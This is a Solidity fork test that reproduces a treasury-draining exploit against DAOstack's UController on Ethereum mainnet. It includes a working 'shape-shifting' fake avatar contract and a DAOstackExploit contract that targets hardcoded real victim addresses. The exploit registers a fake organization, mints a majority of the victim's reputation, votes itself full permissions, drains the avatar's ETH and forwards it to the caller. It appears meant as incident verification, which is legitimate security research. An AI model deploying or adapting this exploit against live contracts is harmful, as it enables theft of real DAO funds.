// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Z3-H10 DAOstack Genesis Alpha (Ethereum) — re-arm-on-deposit verification.
//
// Bug (framework-level, UController is permissionless and unverified): newOrganization(avatar) takes
// a CALLER-SUPPLIED avatar, reads avatar.nativeReputation()/nativeToken() and registers the caller as
// a full-permission (0x1F) scheme over that org — with no check that the reputation is already
// governed by another organization. A "shape-shifting" fake avatar (decoy on the first getter read,
// the victim's real Reputation afterwards) therefore lets any fresh address register itself against
// the victim's Reputation, mint itself a majority of it via the UController (the Reputation's owner),
// pass any proposal on the REAL avatar, and drain its treasury (sendEther).
//
// 2026-09-xx incident: 4.025 ETH (the whole treasury) taken from Avatar 0x7b11dFb2....
// This test re-arms the same Avatar with a simulated fresh funding at the latest block and repeats
// the capture with a brand-new attacker. Read-only on mainnet: fork only.

import {ForkEnv} from "../src/ForkEnv.sol";

interface IUController {
    function newOrganization(address _avatar) external;
    function mintReputation(uint256 _amount, address _to, address _avatar) external returns (bool);
    function sendEther(uint256 _amountInWei, address _to, address _avatar) external returns (bool);
}

interface ISchemeRegistrar {
    function proposeScheme(
        address _avatar,
        address _scheme,
        bytes32 _parametersHash,
        bytes4 _permissions
    ) external returns (bytes32);
}

interface IGenesisProtocol {
    function vote(bytes32 _proposalId, uint256 _vote) external returns (bool);
}

interface IReputation {
    function totalSupply() external view returns (uint256);
    function reputationOf(address _owner) external view returns (uint256);
}

contract Stub {}

// Shape-shifter: first read of each getter returns a decoy, later reads return the victim's real
// contracts (mirrors the on-chain helper used in the incident).
contract FakeAvatar {
    address public immutable controller;
    address public immutable realReputation;
    address public immutable realToken;
    address public immutable decoyReputation;
    address public immutable decoyToken;

    uint256 private repReads;
    uint256 private tokenReads;

    constructor(address _controller, address _realReputation, address _realToken) {
        controller = _controller;
        realReputation = _realReputation;
        realToken = _realToken;
        decoyReputation = address(new Stub());
        decoyToken = address(new Stub());
    }

    function owner() external view returns (address) {
        return controller;
    }

    function nativeReputation() external returns (address) {
        repReads += 1;
        return repReads == 1 ? decoyReputation : realReputation;
    }

    function nativeToken() external returns (address) {
        tokenReads += 1;
        return tokenReads == 1 ? decoyToken : realToken;
    }
}

contract DAOstackExploit {
    IUController constant UCONTROLLER = IUController(0xD5bEe5D9Ae589094c51e533f35656963fdA87305);
    ISchemeRegistrar constant SCHEME_REGISTRAR = ISchemeRegistrar(0x781f48F300f9c2f4862347537927FC9Dc48415E0);
    IGenesisProtocol constant VOTING_MACHINE = IGenesisProtocol(0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba);

    address constant VICTIM_AVATAR = 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0;
    address constant REAL_REPUTATION = 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9;
    address constant REAL_TOKEN = 0xe30a71938b743d126E977A2b3F7450484F209a34;

    address payable immutable beneficiary;

    constructor() {
        beneficiary = payable(msg.sender);
    }

    function run(uint256 mintAmount, uint256 drainAmount) external {
        FakeAvatar fakeAvatar = new FakeAvatar(address(UCONTROLLER), REAL_REPUTATION, REAL_TOKEN);
        UCONTROLLER.newOrganization(address(fakeAvatar));
        require(UCONTROLLER.mintReputation(mintAmount, address(this), address(fakeAvatar)), "mint failed");

        bytes32 proposalId =
            SCHEME_REGISTRAR.proposeScheme(VICTIM_AVATAR, address(this), bytes32(0), bytes4(0x0000001f));
        require(VOTING_MACHINE.vote(proposalId, 1), "vote failed");

        require(UCONTROLLER.sendEther(drainAmount, address(this), VICTIM_AVATAR), "sendEther failed");

        (bool ok,) = beneficiary.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}

contract DAOstackRearmTest is ForkEnv {
    IUController constant UCONTROLLER = IUController(0xD5bEe5D9Ae589094c51e533f35656963fdA87305);
    IReputation constant REPUTATION = IReputation(0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9);
    address constant VICTIM_AVATAR = 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0;

    function setUp() public {
        vm.createSelectFork(_rpc("FORK_RPC_URL", _rpc("RPC_URL", "https://ethereum-rpc.publicnode.com")));
    }

    receive() external payable {}

    function test_DAOstack_rearm_funded_avatar_is_capturable() public {
        uint256 forkBlock = block.number;
        emit log_named_uint("fork block", forkBlock);

        uint256 supplyBefore = REPUTATION.totalSupply();
        emit log_named_decimal_uint("Reputation totalSupply (pre)", supplyBefore, 18);
        emit log_named_decimal_uint("Avatar ETH (pre)", VICTIM_AVATAR.balance, 18);
        assertEq(VICTIM_AVATAR.balance, 0, "avatar is empty today (post-incident)");

        // --- re-arm: fresh ETH lands in the DAO treasury (grant / refund / donation) ---
        uint256 FUND = 4.025 ether;
        vm.deal(VICTIM_AVATAR, FUND);
        emit log_named_decimal_uint("Avatar ETH (after fresh funding)", VICTIM_AVATAR.balance, 18);

        // --- fresh attacker: mint >50% of reputation (needs > current supply to hold a majority) ---
        uint256 mintAmount = supplyBefore * 2; // ~66.7% of the new supply
        uint256 attackerBefore = address(this).balance;
        DAOstackExploit exploit = new DAOstackExploit();
        exploit.run(mintAmount, FUND);
        uint256 received = address(this).balance - attackerBefore;

        emit log_named_decimal_uint("Avatar ETH (post)", VICTIM_AVATAR.balance, 18);
        emit log_named_decimal_uint("attacker received", received, 18);

        assertEq(VICTIM_AVATAR.balance, 0, "avatar drained again");
        assertApproxEqAbs(received, FUND, 1e15, "fresh attacker captured the whole treasury");
    }

    // Confirms the permissionless primitive itself still holds at the latest block (fresh stranger).
    function test_DAOstack_newOrganization_still_permissionless() public {
        address stranger = makeAddr("stranger2");
        vm.startPrank(stranger);
        FakeAvatar fakeAvatar =
            new FakeAvatar(address(UCONTROLLER), 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9, 0xe30a71938b743d126E977A2b3F7450484F209a34);
        UCONTROLLER.newOrganization(address(fakeAvatar));
        bool ok = UCONTROLLER.mintReputation(1234e18, stranger, address(fakeAvatar));
        vm.stopPrank();
        assertTrue(ok, "arbitrary caller minted on a reputation it never owned");
        assertEq(REPUTATION.reputationOf(stranger), 1234e18, "stranger holds reputation on victim's Reputation");
    }
}
